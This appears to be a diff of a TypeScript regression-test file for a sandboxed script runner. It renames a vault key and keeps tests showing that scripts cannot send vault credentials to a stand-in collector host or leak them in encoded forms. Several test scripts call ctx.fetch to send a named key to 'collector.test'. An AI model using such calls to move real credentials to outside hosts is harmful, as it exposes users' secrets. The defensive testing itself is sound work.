@@ -4,8 +4,8 @@
  *
  * A SCRIPT NAMES ITS KEYS AND ITS ORIGINS AS TWO LISTS, AND NOTHING JOINED THEM. The audit's probe ran the runner as
  * `server.ts` builds it with a vault of two grants: `goldapi`, whose entry says it opens `api.gold.test`, went out as a
- * bearer to `collector.test` because that origin was also in the script's `egress:`, and the vault's `spark` key (the
- * one the included model answers everybody with on a host with no `SPARK_KEY`) went the same way. Every grant row
+ * bearer to `collector.test` because that origin was also in the script's `egress:`, and the vault's `slash` key (the
+ * one the included model answers everybody with on a host with no `SLASH_KEY`) went the same way. Every grant row
  * says what it opens (`opens TEXT NOT NULL`), and nothing on the script's path read it.
  *
  * AND THE SCRUB KNEW ONE SPELLING OF THE KEY. `sendAction` took the key out of a provider's answer as the exact bytes
@@ -30,15 +30,15 @@ const GOLD = 'https://api.gold.test';
 const COLLECTOR = 'https://collector.test';
 
 /** Every grant's bytes, by id. Not secrets: each says whose it is, so a leak names its own source. */
-const SECRET: Record<string, string> = { g_gold: 'SECRET-OF-goldapi', g_spark: 'SECRET-OF-spark', g_slash: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' };
+const SECRET: Record<string, string> = { g_gold: 'SECRET-OF-goldapi', g_slash: 'SECRET-OF-slash', g_slashes: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' };
 
 type Row = { id: string; label: string; opens: string; revoked_at: string | null; created_at: string };
 const at = '2026-09-22T00:00:00.000Z';
 const VAULT: Row[] = [
   { id: 'g_gold', label: 'goldapi', opens: 'api.gold.test', revoked_at: null, created_at: at },
-  /* THE SPARK KEY IS SAID TO OPEN THE COLLECTOR, so the only thing that can refuse it there is its label. */
-  { id: 'g_spark', label: 'spark', opens: 'collector.test', revoked_at: null, created_at: at },
-  { id: 'g_slash', label: 'slashed', opens: 'https://api.gold.test/', revoked_at: null, created_at: at },
+  /* THE KEY LABELLED `slash` IS SAID TO OPEN THE COLLECTOR, so the only thing that can refuse it there is its label. */
+  { id: 'g_slash', label: 'slash', opens: 'collector.test', revoked_at: null, created_at: at },
+  { id: 'g_slashes', label: 'slashed', opens: 'https://api.gold.test/', revoked_at: null, created_at: at },
   /* A PARENT OF THE HOST FETCHED, and prose, the two ways an `opens` does not name `api.gold.test` exactly. */
   { id: 'g_parent', label: 'parent', opens: 'gold.test', revoked_at: null, created_at: at },
   { id: 'g_prose', label: 'prose', opens: 'the Gold test account', revoked_at: null, created_at: at },
@@ -141,13 +141,13 @@ test('A KEY SENT AWAY IS A RULE BROKEN, NOT AN ERROR TO CATCH: the run is refuse
   assert.deepEqual(caught.sent, []);
 });
 
-test("THE VAULT'S spark KEY IS NEVER A SCRIPT'S, by its label or by its id, even to the host its entry opens", async () => {
-  /* K2 IN THE AUDIT: `{"answer":"ran","opened":["spark"],"sent":[{"host":"collector.test","auth":"Bearer SECRET-OF-spark"}]}`. */
-  for (const name of ['spark', 'g_spark']) {
+test("THE VAULT'S `slash` KEY IS NEVER A SCRIPT'S, by its label or by its id, even to the host its entry opens", async () => {
+  /* K2 IN THE AUDIT: `{"answer":"ran","opened":["slash"],"sent":[{"host":"collector.test","auth":"Bearer SECRET-OF-slash"}]}`. */
+  for (const name of ['slash', 'g_slash']) {
     const named = await run(`export default async function run(ctx) { await ctx.fetch(${JSON.stringify(COLLECTOR)} + '/in', { key: ${JSON.stringify(name)} }); }`, [COLLECTOR], [name]);
     assert.ok('refused' in named.answer, `${name}: ${JSON.stringify(named.answer)}`);
     assert.equal(named.answer.refused.code, 'FORBIDDEN', name);
-    assert.match(named.answer.refused.why, /spark/, name);
+    assert.match(named.answer.refused.why, /slash/, name);
     assert.deepEqual(named.sent, [], name);
     assert.deepEqual(named.opened, [], name);
   }
@@ -156,7 +156,7 @@ test("THE VAULT'S spark KEY IS NEVER A SCRIPT'S, by its label or by its id, even
 test('THE KEY IS SCRUBBED FROM AN ANSWER IN EVERY SPELLING A PROVIDER ECHOES IT IN: JSON-escaped, base64 and URL-encoded', async () => {
   /* THE AUDIT'S KEY, WITH A `/` IN IT, because a key without one is the same bytes JSON-escaped and URL-encoded and the
      two cases would pass by accident. Measured before the fix in workerd: all three spellings arrived in `ctx.log`. */
-  const key = SECRET['g_slash']!;
+  const key = SECRET['g_slashes']!;
   const { answer, sent } = await run(
     `export default async function run(ctx) {
   for (const path of ['/php', '/b64', '/url']) {
@@ -201,8 +201,8 @@ test('A KEY SENT AWAY AND THEN AN OVERRUN IS FORBIDDEN, as on the Cloud: the bro
   assert.deepEqual(late.sent, []);
 });
 
-test('A DECLARATION THAT IS MALFORMED AND NAMES THE spark KEY IS FORBIDDEN, as on the Cloud', async () => {
-  const both = await run(`export default async function run(ctx) { ctx.log('never'); }`, [COLLECTOR], ['spark'], { wall_ms: 0 });
+test('A DECLARATION THAT IS MALFORMED AND NAMES THE `slash` KEY IS FORBIDDEN, as on the Cloud', async () => {
+  const both = await run(`export default async function run(ctx) { ctx.log('never'); }`, [COLLECTOR], ['slash'], { wall_ms: 0 });
   assert.ok('refused' in both.answer, JSON.stringify(both.answer));
   assert.equal(both.answer.refused.code, 'FORBIDDEN');
   assert.deepEqual([both.sent, both.opened], [[], []]);
